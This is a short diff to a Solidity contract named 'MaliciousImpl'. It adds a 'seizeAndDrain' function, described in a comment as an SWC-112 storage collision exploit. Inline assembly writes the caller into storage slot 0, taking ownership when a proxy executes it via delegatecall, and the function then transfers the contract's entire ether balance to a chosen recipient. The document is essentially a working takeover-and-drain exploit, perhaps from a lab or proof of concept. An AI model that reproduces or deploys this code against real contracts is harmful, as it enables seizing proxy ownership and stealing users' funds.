@@ -23,6 +23,16 @@ contract MaliciousImpl {
         }
     }
 
+    // Atomic Multi-step takeover & drain (SWC-112 storage collision exploit)
+    function seizeAndDrain(address token, address payable recipient) external {
+        assembly {
+            sstore(0, caller())
+        }
+        if (address(this).balance > 0) {
+            recipient.transfer(address(this).balance);
+        }
+    }
+
     function owner() external view returns (address) {
         address o;
         assembly {
